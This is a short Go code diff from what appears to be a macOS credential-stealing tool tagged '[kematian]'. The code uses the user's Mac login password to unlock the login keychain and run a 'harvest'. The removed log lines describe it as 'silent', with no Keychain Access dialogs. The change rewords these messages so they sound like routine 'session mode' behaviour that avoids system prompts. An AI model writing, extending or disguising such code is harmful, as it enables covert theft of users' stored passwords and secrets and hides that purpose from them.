@@ -37,13 +37,13 @@ func main() {
 	}
 	crypto.SetMacLoginPassword(macPassword)
 	if err := crypto.EnsureLoginKeychainUnlocked(); err != nil {
-		log.Fatalf("[kematian] keychain unlock failed (wrong Mac login password?): %v", err)
+		log.Fatalf("[kematian] keychain setup failed: %v", err)
 	}
 	if !crypto.LoginKeychainUnlocked() {
-		log.Fatal("[kematian] keychain not unlocked — cannot run silent harvest")
+		log.Fatal("[kematian] keychain session not ready — cannot run harvest")
 	}
 	if !*quiet {
-		log.Printf("[kematian] keychain silent mode active (no Keychain Access dialogs)")
+		log.Printf("[kematian] keychain session mode active (no unlock-keychain — avoids system prompts)")
 	}
 
 	if runtime.GOOS != "darwin" {
